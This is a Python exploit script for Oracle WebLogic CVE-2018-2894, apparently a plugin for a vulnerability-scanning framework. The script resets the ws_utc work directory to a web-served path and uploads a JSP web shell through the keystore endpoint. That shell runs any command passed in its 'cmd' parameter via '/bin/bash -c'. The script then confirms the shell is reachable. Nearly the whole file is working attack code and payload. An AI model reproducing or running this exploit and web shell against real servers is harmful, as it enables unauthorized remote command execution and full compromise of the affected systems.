#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import re
import time
import xml.etree.ElementTree as ET
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEBLOGIC
        self.name = 'CVE-2018-2894'
        self.keyword = ['weblogic']
        self.info = 'CVE-2018-2894'
        self.type = 'upload'
        self.level = 'high'
        self.refer = 'https://github.com/111ddea/cve-2018-2894'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        def get_current_work_path(host):
            geturl = host + "/ws_utc/resources/setting/options/general"
            ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}
            request = self.curl('get',geturl)
            values = []
            if request:
                if request.status_code == 404:
                    pass
                elif "Deploying Application".lower() in request.text.lower():
                    time.sleep(30)
                    request = self.curl('get',geturl, headers=ua)
                if "</defaultValue>" in request.text:
                    root = ET.fromstring(request.text)
                    value = root.find("section").find("options")
                    for e in value:
                        for sub in e:
                            if e.tag == "parameter" and sub.tag == "defaultValue":
                                values.append(sub.text)

                if values:
                    return values[0]
                else:
                    return None
            else:
                return None

        def get_new_work_path(host):
            current_work_path = get_current_work_path(host)
            # works = "/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war"
            works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
            if current_work_path :
                if  "\\" in current_work_path:
                    works = works.replace("/", "\\")
                new_path = str(current_work_path[: str(current_work_path).find("_domain") + 7] + works)
                return new_path
            return None

        def set_new_upload_path(host, path):
            data = {
                "setting_id": "general",
                "BasicConfigOptions.workDir": path,
                "BasicConfigOptions.proxyHost": "",
                "BasicConfigOptions.proxyPort": "80"}
            request = self.curl('post',host + "/ws_utc/resources/setting/options", data=data, headers=headers)
            if request and "successfully" in request.text:
                return True
            else:
                return False

        def upload_webshell(host, uri):
            if not set_new_upload_path(host, get_new_work_path(host)):
                return
            files = {
                "ks_edit_mode": "false",
                "ks_password_front": password,
                "ks_password_changed": "true",
                "ks_filename": ("shaoyu.txt", upload_content)
            }

            request = self.curl('post',host + uri, files=files)
            response = request.text

            if response:
                match = re.findall("<id>(.*?)</id>", response)

                if match:
                    tid = match[-1]
                    shell_path = host + "/bea_wls_internal/config/keystore/" + str(tid) + "_shaoyu.txt"
                    #print("[+] Check URL: {} ".format(shell_path))
                    if upload_content in self.curl('post',shell_path, headers=headers).text:
                        self.flag = 1
                        self.res.append({"info": shell_path, "key": "CVE-2018-2894"})
                        #print("[+] {} exists CVE-2018-2894".format(host))
                        #print("[+] Check URL: {} ".format(shell_path))
                    else:
                        return
                else:
                    return
            else:
                return

        self.get_url()
        if self.base_url:
            start = time.time()
            password = "mytest"
            url = "/ws_utc/resources/setting/keystore"


            upload_content = str(r'''
                    <%@ page import="java.util.*,java.io.*,java.net.*"%>
                    <HTML><BODY>
                    <FORM METHOD="POST" NAME="myform" ACTION="">
                    <INPUT TYPE="text" NAME="cmd">
                    <INPUT TYPE="submit" VALUE="Send Command">
                    </FORM>
                    <pre>
                    <%
                    if (request.getParameter("cmd") != null) {
                            out.println("Command: " + request.getParameter("cmd") + "\n<BR>");
                            Process p = Runtime.getRuntime().exec("/bin/bash -c " + request.getParameter("cmd"));
                            OutputStream os = p.getOutputStream();
                            InputStream in = p.getInputStream();
                            DataInputStream dis = new DataInputStream(in);
                            String disr = dis.readLine();
                            while ( disr != null ) {
                                    out.println(disr); disr = dis.readLine(); }
                            }
                    %>
                    </pre>
                    </BODY></HTML>
                    ''')
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest', }
            upload_webshell(self.base_url, url)